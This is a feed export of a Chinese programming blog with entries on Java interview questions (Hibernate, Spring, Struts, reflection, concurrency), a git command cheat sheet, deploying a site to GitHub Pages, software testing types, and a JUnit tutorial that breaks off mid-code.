title="十一、谈谈Hibernate的理解，一级和二级缓存的作用，在项目中Hibernate都是怎么使用缓存的？"></a>十一、谈谈Hibernate的理解，一级和二级缓存的作用，在项目中Hibernate都是怎么使用缓存的？</h2><p>Hibernate是一个开发的对象关系映射框架（ORM）。它对JDBC进行了非常对象封装，Hibernate允许程序员采用面向对象的方式来操作关系数据库。</p><p><strong>Hibernate的优点：</strong></p><ol><li>程序更加面向对象</li><li>提高了生产率</li><li>方便移植</li><li>无入侵性</li></ol><p><strong>Hibernate的缺点：</strong></p><ol><li>效率比JDBC略差</li><li>不适合批量操作</li><li>只能配置一种关联关系</li></ol><p><strong>Hibernate有四种查询方式：</strong></p><ol><li>get、load方法，根据ID号查询对象。</li><li>Hibernate Query Language, HQL</li><li>标准查询语言</li><li>通过SQL查询</li></ol><p><strong>Hibernate工作原理：</strong></p><ol><li>配置Hibernate对象关系映射文件、启动服务器</li><li>服务器通过实例化Configuration对象，读取hibernate.cfg.xml文件的配置内容，并根据相关的需求建好表以及表之间的映射关系。</li><li>通过实例化的Configuration对象建立SessionFactory实例，通过SessionFactory实例创建Session对象。</li><li>通过Session对象完成数据库的增删改查操作。</li></ol><p><strong>Hibernate中的状态转移：</strong></p><p><em>临时状态（Transient）</em></p><ol><li>不处于SESSION缓存中</li><li>数据库中没有对象记录</li></ol><p><strong>补充说明-Java是如何进入临时状态的：</strong>1、通过new语句创建一个对象时。2、刚调用Session的delete()方法时，从Session缓存中删除一个对象时。</p><p><em>持久化状态(Persisted)</em><br>1、处于Session缓存中<br>2、持久化对象数据库中没有对象记录<br>3、Session在特定的时刻会保存两者同步</p><p>补<strong>充说明-Java如何进入持久化状态</strong>：1、Session的save()方法。2、Session的load().get()方法返回的对象。3、Session的find()方法返回的list集合中存放的对象。4、Session的update().save()方法。</p><p><em>流离状态（Detached）</em><br>1、不再位于Session缓存中<br>2、游离对象由持久化状态转变而来，数据库中还没有相应记录。</p><p><strong>补充说明-Java如何进入流离状态：</strong></p><p>1、Session的close()。2、 Session的evict()方法，从缓存中删除一个对象。</p><p>具体如下图所示：<br><img src="https://i.imgur.com/StmlgBX.png" alt></p><p>Hibernate中的缓存主要有Session缓存（一级缓存）和SessionFactory缓存（二级缓存，一般由第三方提供）。</p><h2 id="十二、谈谈Hibernate与iBatis的区别，哪个性能会更高一些"><a href="#十二、谈谈Hibernate与iBatis的区别，哪个性能会更高一些" class="headerlink" title="十二、谈谈Hibernate与iBatis的区别，哪个性能会更高一些"></a>十二、谈谈Hibernate与iBatis的区别，哪个性能会更高一些</h2><ol><li>Hibernate偏向于对象的操作达到数据库相关操作的目的；而iBatis更偏向于SQL语句的优化。</li><li>Hibernate的使用的查询语句是自己的HQL，而iBatis则是标准的SQL语句。</li><li>Hibernate相对复杂，不易学习；iBatis类似SQL语句，简单易学。</li></ol><p><strong>性能方面：</strong></p><ol><li>如果系统数据处理量巨大，性能要求极为苛刻时，往往需要人工编写高性能的SQL语句或存错过程，此时iBatis具有更好的可控性，因此性能优于Hibernate。</li><li>同样的需求下，由于Hibernate可以自动生成HQL语句，而iBatis需要手动写SQL语句，此时采用Hibernate的效率高于iBatis。</li></ol><h2 id="十三、对Spring的理解，项目中都用什么？怎么用的？对IOC、和AOP的理解及实现原理。"><a href="#十三、对Spring的理解，项目中都用什么？怎么用的？对IOC、和AOP的理解及实现原理。" class="headerlink" title="十三、对Spring的理解，项目中都用什么？怎么用的？对IOC、和AOP的理解及实现原理。"></a>十三、对Spring的理解，项目中都用什么？怎么用的？对IOC、和AOP的理解及实现原理。</h2><p>Spring是一个开源框架，处于MVC模式中的控制层，它能应对需求快速的变化，其主要原因它有一种面向切面编程（AOP）的优势，其次它提升了系统性能，因为通过依赖倒置机制（IOC），系统中用到的对象不是在系统加载时就全部实例化，而是在调用到这个类时才会实例化该类的对象，从而提升了系统性能。这两个优秀的性能使得Spring受到许多J2EE公司的青睐，如阿里中使用最多的也是Spring相关技术。</p><p><strong>Spring的优点：</strong></p><ol><li>降低了组件之间的耦合性，实现了软件各层之间的解耦。</li><li>可以使用容易提供的众多服务，如事务管理，消息服务，日志记录等。</li><li>容器提供了AOP技术，利用它很容易实现如权限拦截、运行期监控等功能。</li></ol><p>Spring中AOP技术是设计模式中的动态代理模式。只需实现jdk提供的动态代理接口InvocationHandler，所有被代理对象的方法都由InvocationHandler接管实际的处理任务。面向切面编程中还要理解切入点、切面、通知、织入等概念。</p><p>Spring中IOC则利用了Java强大的反射机制来实现。所谓依赖注入即组件之间的依赖关系由容器在运行期决定。其中依赖注入的方法有两种，通过构造函数注入，通过set方法进行注入。</p><h2 id="十四、描述Struts的工作流程"><a href="#十四、描述Struts的工作流程" class="headerlink" title="十四、描述Struts的工作流程"></a>十四、描述Struts的工作流程</h2><ol><li>在web应用启动时，加载并初始化ActionServlet，ActionServlet从struts-config.xml文件中读取配置信息，将它们存放到各个配置对象中。</li><li>当ActionServlet接收到一个客户请求时，首先检索和用户请求相匹配的ActionMapping实例，如果不存在，就返回用户请求路径无效信息。</li><li>如果ActionForm实例不存在，就创建一个ActionForm对象，把客户提交的表单数据保存到ActionForm对象中。</li><li>根据配置信息决定是否需要验证表单，如果需要，就调用ActionForm的validate()方法，如果ActionForm的validate()方法返回null或返回一个不包含ActionMessage的ActionErrors对象，就表示表单验证成功。</li><li>ActionServlet根据ActionMapping实例包含的映射信息决定请求转发给哪个Action，如果相应的Action实例不存在，就先创建一个实例，然后调用Action的execute()方法。</li></ol><p><strong>补充说明</strong>：以上部分的相关问题考察面试者在实际软件开发中所使用的Java语言相关框架以及对于框架原理的了解程度，这一部分我们需要注意一些常见的框架，不仅需要知道它们是干什么的，还需要知道它们背后的原理，常会问到的框架有Spring Boot/Spring Cloud全家桶、Hibernate、MyBaits、Netty、Kafka等，最重要的还有阿里巴巴开源的Apache Dubbo框架。</p><h2 id="十五、关于Java内存模型，一个对象（两个属性，四个方法）实例化100次，现在内存中的存储状态，几个对象，几个属性，几个方法。由于Java中new出来的对象都是放在堆中，所以如果要实例化100次，将在堆中产生100个对象，一般对象与其中的属性、方法都属于一个整体，但如果-属性和方法是静态的，就是用static关键字声明的，那么属于类的属性和方法永远只在内存中存在一份-。"><a href="#十五、关于Java内存模型，一个对象（两个属性，四个方法）实例化100次，现在内存中的存储状态，几个对象，几个属性，几个方法。由于Java中new出来的对象都是放在堆中，所以如果要实例化100次，将在堆中产生100个对象，一般对象与其中的属性、方法都属于一个整体，但如果-属性和方法是静态的，就是用static关键字声明的，那么属于类的属性和方法永远只在内存中存在一份-。" class="headerlink" title="十五、关于Java内存模型，一个对象（两个属性，四个方法）实例化100次，现在内存中的存储状态，几个对象，几个属性，几个方法。由于Java中new出来的对象都是放在堆中，所以如果要实例化100次，将在堆中产生100个对象，一般对象与其中的属性、方法都属于一个整体，但如果 属性和方法是静态的，就是用static关键字声明的，那么属于类的属性和方法永远只在内存中存在一份 ##。"></a>十五、关于Java内存模型，一个对象（两个属性，四个方法）实例化100次，现在内存中的存储状态，几个对象，几个属性，几个方法。由于Java中new出来的对象都是放在堆中，所以如果要实例化100次，将在堆中产生100个对象，一般对象与其中的属性、方法都属于一个整体，但如果 属性和方法是静态的，就是用static关键字声明的，那么属于类的属性和方法永远只在内存中存在一份 ##。</h2><h2 id="十六、反射讲一讲，主要是概念-都在哪需要反射机制，反射的性能，如何优化？"><a href="#十六、反射讲一讲，主要是概念-都在哪需要反射机制，反射的性能，如何优化？" class="headerlink" title="十六、反射讲一讲，主要是概念,都在哪需要反射机制，反射的性能，如何优化？"></a>十六、反射讲一讲，主要是概念,都在哪需要反射机制，反射的性能，如何优化？</h2><p><strong>反射机制的定义：</strong></p><p>是在运行状态中，对于任意的一个类，都能够知道这个类的所有属性和方法，对任意一个对象都能够通过反射机制调用一个类的任意方法，这种动态获取类信息及动态调用类对象方法的功能称为java的反射机制。</p><p><strong>反射的作用：</strong></p><ol><li>动态地创建类的实例，将类绑定到现有的对象中，或从现有的对象中获取类型。</li><li>应用程序需要在运行时从某个特定的程序集中载入一个特定的类。</li></ol><h2 id="十七、线程同步，并发操作怎么控制？"><a href="#十七、线程同步，并发操作怎么控制？" class="headerlink" title="十七、线程同步，并发操作怎么控制？"></a>十七、线程同步，并发操作怎么控制？</h2><p>Java中可在方法名前加关键字syschronized来处理当有多个线程同时访问共享资源时候的问题。syschronized相当于一把锁，当有申请者申请该资源时，如果该资源没有被占用，那么将资源交付给这个申请者使用，在此期间，其他申请者只能申请而不能使用该资源，当该资源被使用完成后将释放该资源上的锁，其他申请者可申请使用。并发控制主要是为了多线程操作时带来的资源读写问题。如果不加以空间可能会出现死锁，读脏数据、不可重复读、丢失更新等异常。</p><p><strong>并发操作可以通过加锁的方式进行控制，锁又可分为乐观锁和悲观锁。</strong></p><p><strong>悲观锁：</strong></p><p>悲观锁并发模式假定系统中存在足够多的数据修改操作，以致于任何确定的读操作都可能会受到由个别的用户所制造的数据修改的影响。也就是说悲观锁假定冲突总会发生，通过独占正在被读取的数据来避免冲突。但是独占数据会导致其他进程无法修改该数据，进而产生阻塞，读数据和写数据会相互阻塞。</p><p><strong>乐观锁：</strong></p><p>乐观锁假定系统的数据修改只会产生非常少的冲突，也就是说任何进程都不大可能修改别的进程正在访问的数据。乐观并发模式下，读数据和写数据之间不会发生冲突，只有写数据与写数据之间会发生冲突。即读数据不会产生阻塞，只有写数据才会产生阻塞。</p><p><strong>补充说明</strong>：最后的几个问题又回到了Java内存模型以及进程、线程的底层知识上，其实无论是对于Java网络编程也好，还是对于Java框架的使用也好，这都离不开Java语言底层的技术支撑，因此了解底层知识是做好优化的重中之重。</p>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何把更新后的项目重新传到github上</title>
      <link href="2018/04/23/ru-he-ba-geng-xin-hou-de-xiang-mu-chong-xin-chuan-dao-github-shang/"/>
      <url>2018/04/23/ru-he-ba-geng-xin-hou-de-xiang-mu-chong-xin-chuan-dao-github-shang/</url>
      
        <content type="html"><![CDATA[<h2 id="以后更新项目基本上就是使用下面这几条命令就行："><a href="#以后更新项目基本上就是使用下面这几条命令就行：" class="headerlink" title="以后更新项目基本上就是使用下面这几条命令就行："></a>以后更新项目基本上就是使用下面这几条命令就行：</h2><p>自己主要是更新github上的项目所以刚开始上传请看下面转自某位大神的博客，但是如果是更新github上面的项目就比较简单。</p><ol><li><p>在本地的git仓库把你更新好的项目拷到下面然后打开命令行<img src="https://img-blog.csdn.net/20180528205558250" alt></p></li><li><p>使用下面命令就行</p><ul><li>git status</li><li>git add . </li><li>git commit -m “本次更新的说明”</li><li>git push origin master # 将本地主分支推到远程主分支<br><img src="https://img-blog.csdn.net/20180528224516824" alt></li></ul><h2 id="Git命令"><a href="#Git命令" class="headerlink" title="Git命令"></a>Git命令</h2><p>查看、添加、提交、删除、找回，重置修改文件</p><p>git help <command> # 显示command的help</p><p>git show # 显示某次提交的内容 git show $id</p><p>git co -<file> # 抛弃工作区修改</file></p><p>git co . # 抛弃工作区修改</p><p>git add <file> # 将工作文件修改提交到本地暂存区</file></p><p>git add . # 将所有修改过的工作文件提交暂存区</p><p>git rm <file> # 从版本库中删除文件</file></p><p>git rm <file> –cached # 从版本库中删除文件，但不删除文件</file></p><p>git reset <file> # 从暂存区恢复到工作文件</file></p><p>git reset -. # 从暂存区恢复到工作文件</p><p>git reset –hard # 恢复最近一次提交过的状态，即放弃上次提交后的所有本次修改</p><p>git ci <file> git ci . git ci -a # 将git add, git rm和git ci等操作都合并在一起做git ci -am “some comments”</file></p><p>git ci –amend # 修改最后一次提交记录</p><p>git revert &lt;$id&gt; # 恢复某次提交的状态，恢复动作本身也创建次提交对象</p><p>git revert HEAD # 恢复最后一次提交的状态</p></li></ol><h2 id="查看文件diff"><a href="#查看文件diff" class="headerlink" title="查看文件diff"></a>查看文件diff</h2><pre><code>-     git diff &lt;file&gt; # 比较当前文件和暂存区文件差异 git diff-      -     git diff &lt;id1&gt;&lt;id2&gt; # 比较两次提交之间的差异-      -     git diff &lt;branch1&gt;..&lt;branch2&gt; # 在两个分支之间比较-      -     git diff --staged # 比较暂存区和版本库差异-      -     git diff --cached # 比较暂存区和版本库差异-      -     git diff --stat # 仅仅比较统计信息</code></pre><h2 id="查看提交记录"><a href="#查看提交记录" class="headerlink" title="查看提交记录"></a>查看提交记录</h2><pre><code>-     git log git log &lt;file&gt; # 查看该文件每次提交记录-      -     git log -p &lt;file&gt; # 查看每次详细修改内容的diff-      -     git log -p -2 # 查看最近两次详细修改内容的diff-      -     git log --stat #查看提交统计信息</code></pre><p>tig</p><p><strong>Mac上可以使用tig代替diff和log，brew install tig</strong></p><h2 id="Git-本地分支管理"><a href="#Git-本地分支管理" class="headerlink" title="Git 本地分支管理"></a>Git 本地分支管理</h2><p>查看、切换、创建和删除分支</p><pre><code>-     git br -r # 查看远程分支-      -     git br &lt;new_branch&gt; # 创建新的分支-      -     git br -v # 查看各个分支最后提交信息-      -     git br --merged # 查看已经被合并到当前分支的分支-      -     git br --no-merged # 查看尚未被合并到当前分支的分支-      -     git co &lt;branch&gt; # 切换到某个分支-      -     git co -b &lt;new_branch&gt; # 创建新的分支，并且切换过去-      -     git co -b &lt;new_branch&gt; &lt;branch&gt; # 基于branch创建新的new_branch-      -     git co $id # 把某次历史提交记录checkout出来，但无分支信息，切换到其他分支会自动删除-      -     git co $id -b &lt;new_branch&gt; # 把某次历史提交记录checkout出来，创建成一个分支-      -     git br -d &lt;branch&gt; # 删除某个分支-      -     git br -D &lt;branch&gt; # 强制删除某个分支 (未被合并的分支被删除的时候需要强制)</code></pre><h2 id="分支合并和rebase"><a href="#分支合并和rebase" class="headerlink" title="分支合并和rebase"></a>分支合并和rebase</h2><pre><code>git merge &lt;branch&gt; # 将branch分支合并到当前分支git merge origin/master --no-ff # 不要Fast-Foward合并，这样可以生成merge提交git rebase master &lt;branch&gt; # 将master rebase到branch，相当于： git co &lt;branch&gt; &amp;&amp; git</code></pre><h2 id="Git补丁管理"><a href="#Git补丁管理" class="headerlink" title="Git补丁管理"></a>Git补丁管理</h2><p>(方便在多台机器上开发同步时用)<br>    git diff &gt; ../sync.patch # 生成补丁</p><pre><code>git apply ../sync.patch # 打补丁git apply --check ../sync.patch #测试补丁能否成功</code></pre><h2 id="Git暂存管理"><a href="#Git暂存管理" class="headerlink" title="Git暂存管理"></a>Git暂存管理</h2><pre><code>git stash # 暂存git stash list # 列所有stashgit stash apply # 恢复暂存的内容git stash drop # 删除暂存区Git远程分支管理git pull # 抓取远程仓库所有分支更新并合并到本地git pull --no-ff # 抓取远程仓库所有分支更新并合并到本地，不要快进合并git fetch origin # 抓取远程仓库更新git merge origin/master # 将远程主分支合并到本地当前分支git co --track origin/branch # 跟踪某个远程分支创建相应的本地分支git co -b &lt;local_branch&gt; origin/&lt;remote_branch&gt; # 基于远程分支创建本地分支，功能同上</code></pre><h2 id="git-push-push所有分支"><a href="#git-push-push所有分支" class="headerlink" title="git push (push所有分支)"></a>git push (push所有分支)</h2><pre><code>git push origin master # 将本地主分支推到远程主分支git push -u origin master # 将本地主分支推到远程(如无远程主分支则创建，用于初始化远程仓库)git push origin &lt;local_branch&gt; # 创建远程分支， origin是远程仓库名git push origin &lt;local_branch&gt;:&lt;remote_branch&gt; # 创建远程分支git push origin :&lt;remote_branch&gt; #先删除本地分支(git br -d &lt;branch&gt;)，然后再push删除远程分支</code></pre><h2 id="Git远程仓库管理"><a href="#Git远程仓库管理" class="headerlink" title="Git远程仓库管理"></a>Git远程仓库管理</h2><pre><code>git remote -v # 查看远程服务器地址和仓库名称git remote show origin # 查看远程服务器仓库状态git remote add origin git@ github:robbin/robbin_site.git # 添加远程仓库地址git remote set-url origin git@ github.com:robbin/robbin_site.git # 设置远程仓库地址</code></pre><h2 id="创建远程仓库"><a href="#创建远程仓库" class="headerlink" title="创建远程仓库"></a>创建远程仓库</h2><pre><code>git clone --bare robbin_site robbin_site.git # 用带版本的项目创建纯版本仓库scp -r my_project.git git@ git.csdn.net:~ # 将纯仓库上传到服务器上mkdir robbin_site.git &amp;&amp; cd robbin_site.git &amp;&amp; git --bare init # 在服务器创建纯仓库git remote add origin git@ github.com:robbin/robbin_site.git # 设置远程仓库地址git push -u origin master # 客户端首次提交git push -u origin develop # 首次将本地develop分支提交到远程develop分支，并且trackgit remote set-head origin master # 设置远程仓库的HEAD指向master分支</code></pre><p><strong>也可以命令设置跟踪远程库和本地库</strong></p><pre><code>git branch --set-upstream master origin/mastergit branch --set-upstream develop origin/develop</code></pre>]]></content>
      
      
      <categories>
          
          <category> Github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用github部署网站</title>
      <link href="2018/04/23/shi-yong-github-bu-shu-wang-zhan/"/>
      <url>2018/04/23/shi-yong-github-bu-shu-wang-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="使用GitHub部署网站"><a href="#使用GitHub部署网站" class="headerlink" title="使用GitHub部署网站"></a>使用GitHub部署网站</h1><p><strong>在部署网站之前，先要有一个GitHub账号，熟悉一些git命令，注册GitHub账号和使用git命令可以参考下面的博客，在博客中介绍的非常详细，我也不做过多的介绍</strong></p><hr>从0开始学习GitHub系列汇总：[http://pan.baidu.com/s/1hsn57YO](http://pan.baidu.com/s/1hsn57YO)<p>注册好GitHub账号并且完善用户信息后可以得到一个下图所示的界面，下图是我的GitHub界面，其中界面中的信息介绍可以参考，<code>从0开始学习 GITHUB 系列之「加入 GITHUB」</code>这篇博客对GitHub界面的信息介绍的非常详细</p><p><img src="https://i.imgur.com/rnbszof.png" alt></p><p>在GitHub上部署网站：</p><p><strong>第一步</strong>：单击Repositories，其中Repositories在GitHub上表示的是仓库，在GitHub上每个项目都存放在仓库里，一个仓库保存一个项目<br><img src="https://i.imgur.com/pPjslYS.jpg" alt></p><p><strong>第二步</strong>：单击根据图中的提示填写信息，信息填写完成后单击Create respository按钮创建仓库<br><img src="https://i.imgur.com/zjbd2WZ.jpg" alt></p><p><strong>第三步</strong>：单击创建好仓库后会自动跳转到下图所示的界面，在界面中单击Settings<br><img src="https://i.imgur.com/KdK0YwY.jpg" alt></p><p><strong>第四步</strong>：提示在下面的操作中需要电脑中安装了git，并且熟悉几个简单的git命令，关于git的安装以及git命令的使用可以参考<code>从0开始学习 GITHUB 系列之「GIT 速成」</code>，这篇博客将git介绍的非常通俗易懂，安装好git后，先在电脑中创建一个文件夹用于保存从Github中克隆下来的仓库，我建的文件夹叫做demo，在d:\Git路径下，打开命令行进入demo文件夹下<br><img src="https://i.imgur.com/T8eLnrI.png" alt><br><strong>第五步</strong>在 命令行中执行<code>https://github.com/leblog/test.git</code>命令</p><p>其中<code>git clone</code>表示要克隆一个项目，后面的<code>https://github.com/leblog/test.git</code>表示项目地址，该地址是由第十二步操作获得的，当在最后一行出现了100%表示，远程仓库已经成功的克隆到了本地<br><img src="https://i.imgur.com/OIRdznD.png" alt><br><strong>第六步</strong>：打开demo文件夹，可以看到在文件夹中多了一个test文件，该文件正是刚刚在GitHub中创建的仓库</p><p><img src="https://i.imgur.com/UnaGLvt.png" alt><br><strong>第七步</strong>：打开文件，并且将需要上传到GitHub上的网站添加到该文件中<br><img src="https://i.imgur.com/6nWYnck.png" alt><br><strong>第八步</strong>：打开命令行，并且进入test文件夹下，并且执行 <code>git add .</code>命令，此命令表示将需要提交到git中的文件先添加到缓存<br><img src="https://i.imgur.com/N5bRudR.png" alt><br><strong>第九步</strong>：执行 <code>git commit -m &quot;first commit .&quot;</code>，此命令表示将文件提交到git中，下面显示的都是提交到git中的文件</p><p><img src="https://i.imgur.com/dopR8lM.png" alt><br><strong>第十步</strong>：执行<code>git push origin master</code>命令，将文件<code>push</code>到GitHub上的master分支上，当出现下图所示的提示信息时，表示网站已经成功的提交到了GitHub上<br><img src="https://i.imgur.com/yM8aV3c.png" alt><br><strong>第十一步</strong>：回到Github上的test仓库，可以看到文件已经全部提交上来了</p><hr>通过观察网址可知，网址的格式为 https:// + GitHub的用户名 + .github.io/ + 仓库的名称<p><img src="https://i.imgur.com/xhbPnpJ.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试知识浅谈</title>
      <link href="2018/04/12/ce-shi-zhi-shi-qian-tan/"/>
      <url>2018/04/12/ce-shi-zhi-shi-qian-tan/</url>
      
        <content type="html"><![CDATA[<h1 id="TDD测试"><a href="#TDD测试" class="headerlink" title="TDD测试"></a>TDD测试</h1><ul><li>TDD测试驱动编程，编程方法，编程思想</li><li>先写测试，再编写业务代码</li><li>源码里编码，CRUD<blockquote><p>   crud是指在做计算处理时的增加(Create)、读取(Read)、更新(Update)和删除(Delete)几个单词的首字母简写。crud主要被用在描述软件系统中数据库或者持久层的基本操作功能。</p></blockquote></li></ul><pre><code>User    Save    del    edit    selectUserservice</code></pre><h1 id="DDD-领域驱动设计"><a href="#DDD-领域驱动设计" class="headerlink" title="DDD  领域驱动设计"></a>DDD  领域驱动设计</h1><p>测试本身也是一套完整的学科</p><hr><ul><li><p>单元测试</p><ul><li>白盒测试 能看到完整代码的</li><li>黑盒测试 没有源码功能测试</li><li>灰盒测试  </li></ul></li><li><p>压力测试</p><ul><li>并发数的问题，能够承载多少的并发</li></ul></li><li><p>疲劳强度测试</p><ul><li>长期稳定运行，超过72小时，</li></ul></li><li><p>冒烟测试</p><ul><li>对主要流程的测试，支付环节</li><li>对一个功能点疯狂的测试</li></ul></li><li><p>集成测试</p><ul><li>完整功能的测试，最重要的是测试整体业务流程</li></ul></li><li><p>回归测试</p><ul><li>增加一个功能</li></ul></li><li><p>自动化测试</p><ul><li>编码,场景设计</li></ul></li><li><p>review</p><ul><li>代码评审</li><li>电商 B2B2C   eg:如果你是天猫的程序员，去京东去工作，试想一下，如果你在京东其程序中添加后门，双十一让网站停止5分钟，后果不堪设想</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> JUint </tag>
            
            <tag> 软件测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JUint单元测试</title>
      <link href="2018/04/12/juint-dan-yuan-ce-shi/"/>
      <url>2018/04/12/juint-dan-yuan-ce-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>JUnit 是用于编写和运行可重复的自动化测试的开源测试框架，这样可以保证我们的代码按预期工作。</p><p>JUnit 可广泛用于工业和作为支架(从命令行)或IDE(如 IDEA)内单独的 Java 程序。</p><p>JUnit 提供：</p><ul><li><p>断言测试预期结果。</p></li><li><p>测试功能共享通用的测试数据。</p></li><li><p>测试套件轻松地组织和运行测试。</p></li><li><p>图形和文本测试运行。</p><h3 id="JUnit-用于测试："><a href="#JUnit-用于测试：" class="headerlink" title="JUnit 用于测试："></a>JUnit 用于测试：</h3></li><li><p>整个对象</p></li><li><p>对象的一部分 - 交互的方法或一些方法</p></li><li><p>几个对象之间的互动(交互)</p></li></ul><h3 id="JUnit-特点"><a href="#JUnit-特点" class="headerlink" title="JUnit 特点"></a>JUnit 特点</h3><ul><li>JUnit 是用于编写和运行测试的开源框架。</li><li>提供了注释，以确定测试方法。</li><li>提供断言测试预期结果。</li><li>提供了测试运行的运行测试。</li><li>JUnit 测试让您可以更快地编写代码，提高质量</li><li>JUnit 是优雅简洁。它是不那么复杂以及不需要花费太多的时间。</li><li>JUnit 测试可以自动运行，检查自己的结果，并提供即时反馈。没有必要通过测试结果报告来手动梳理。</li><li>JUnit 测试可以组织成测试套件包含测试案例，甚至其他测试套件。</li><li>Junit 显示测试进度的，如果测试是没有问题条形是绿色的，测试失败则会变成红色。</li></ul><h1 id="POM"><a href="#POM" class="headerlink" title="POM"></a>POM</h1><p><code>pom.xml</code>文件如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;com.funtl&lt;/groupId&gt;    &lt;artifactId&gt;hello-spring&lt;/artifactId&gt;    &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;    &lt;packaging&gt;jar&lt;/packaging&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;            &lt;version&gt;4.3.17.RELEASE&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;junit&lt;/groupId&gt;            &lt;artifactId&gt;junit&lt;/artifactId&gt;            &lt;version&gt;4.12&lt;/version&gt;            &lt;scope&gt;test&lt;/scope&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;&lt;/project&gt;</code></pre><p>主要增加了 junit:junit 依赖</p><h3 id="创建测试类"><a href="#创建测试类" class="headerlink" title="创建测试类"></a>创建测试类</h3><p>在测试包下 <code>src/main/test</code> 创建一个名为 <code>MyTest</code> 的测试类，代码如下：</p><pre><code>package com.funtl.hello.spring.test;import org.junit.After;import org.junit.Before;import org.junit.Test;public class MyTest {    /**     * 执行测试方法前执行     */    @Before    public void before() {        System.out.println(&quot;执行 before() 方法&quot;);    }    /**     * 执行测试方法后执行     */    @After    public void after() {        System.out.println(&quot;执行 after() 方法&quot;);    }    @Test    public void testSayHi() {        System.out.println(&quot;Hi Log4j&quot;);    }    @Test    public void testSayHello() {        System.out.println(&quot;Hello Log4j&quot;);    }}</code></pre><h1 id="JUnit-注解"><a href="#JUnit-注解" class="headerlink" title="JUnit 注解"></a>JUnit 注解</h1><table><thead><tr><th>注解</th><th>描述</th></tr></thead><tbody><tr><td><code>@Test</code> <br> public void method()</td><td>测试注释指示该公共无效方法它所附着可以作为一个测试用例。</td></tr><tr><td><code>@Before</code> <br> public void method()</td><td>Before 注释表示，该方法必须在类中的每个测试之前执行，以便执行测试某些必要的先决条件。</td></tr><tr><td><code>@BeforeClass</code><br> public static void method()</td><td>BeforeClass 注释指出这是附着在静态方法必须执行一次并在类的所有测试之前。发生这种情况时一般是测试计算共享配置方法(如连接到数据库)。</td></tr><tr><td><code>@After</code> <br> public void method()</td><td>After 注释指示，该方法在执行每项测试后执行(如执行每一个测试后重置某些变量，删除临时变量等)</td></tr><tr><td></td><td></td></tr><tr><td><code>@AfterClass</code><br> public static void method()</td><td>当需要执行所有的测试在 JUnit 测试用例类后执行，AfterClass 注解可以使用以清理建立方法，(从数据库如断开连接)。注意：附有此批注(类似于 BeforeClass)的方法必须定义为静态</td></tr><tr><td></td><td></td></tr><tr><td><code>@Ignore</code>  <br>public static void method()</td><td>当想暂时禁用特定的测试执行可以使用忽略注释。每个被注解为 @Ignore 的方法将不被执行。</td></tr><tr><td></td><td></td></tr></tbody></table><h1 id="JUnit-断言"><a href="#JUnit-断言" class="headerlink" title="JUnit 断言"></a>JUnit 断言</h1><h3 id="什么是断言"><a href="#什么是断言" class="headerlink" title="什么是断言"></a>什么是断言</h3><blockquote><p>  断言是编程术语，表示为一些布尔表达式，程序员相信在程序中的某个特定点该表达式值为真，可以在任何时候启用和禁用断言验证，因此可以在测试时启用断言而在部署时禁用断言。同样，程序投入运行后，最终用户在遇到问题时可以重新启用断言。</p></blockquote><p>使用断言可以创建更稳定、品质更好且 不易于出错的代码。当需要在一个值为 false 时中断当前操作的话，可以使用断言。单元测试必须使用断言（Junit/JunitX）。</p><h3 id="常用断言方法"><a href="#常用断言方法" class="headerlink" title="常用断言方法"></a>常用断言方法</h3><hr><table><thead><tr><th>断言</th><th>描述</th></tr></thead><tbody><tr><td>void assertEquals([String message], <br>expected value, actual value)</td><td>断言两个值相等。值可能是类型有 int, short, long,<br> byte, char or java.lang.Object. 第一个参数是一个可选的字符串消息</td></tr><tr><td>void assertTrue([String message],<br> boolean condition)</td><td>断言一个条件为真</td></tr><tr><td>void assertFalse([String message]<br>,boolean condition)</td><td>断言一个条件为假</td></tr><tr><td>void assertNotNull([String message],<br> java.lang.Object object)</td><td>断言一个对象不为空(null)</td></tr><tr><td>void assertNull([String message], <br>java.lang.Object object)</td><td>断言一个对象为空(null)</td></tr><tr><td>void assertSame([String message],<br> java.lang.Object expected,<br> java.lang.Object actual)</td><td>断言，两个对象引用相同的对象</td></tr><tr><td>void assertNotSame([String message],<br> java.lang.Object unexpected,<br> java.lang.Object actual)</td><td>断言，两个对象不是引用同一个对象</td></tr><tr><td>void assertArrayEquals([String message],<br> expectedArray, resultArray)</td><td>断言预期数组和结果数组相等。数组的类型可能是 int, long, short, char, byte or java.lang.Object.</td></tr></tbody></table><h3 id="测试断言效果"><a href="#测试断言效果" class="headerlink" title="测试断言效果"></a>测试断言效果</h3><hr>在之前的单元测试类中创建一个名为 `testAssert` 方法来查看断言效果<pre><code>/** * 测试断言 */@Testpublic void testAssert() {    String obj1 = &quot;junit&quot;;    String obj2 = &quot;junit&quot;;    String obj3 = &quot;test&quot;;    String obj4 = &quot;test&quot;;    String obj5 = null;    int var1 = 1;    int var2 = 2;    int[] arithmetic1 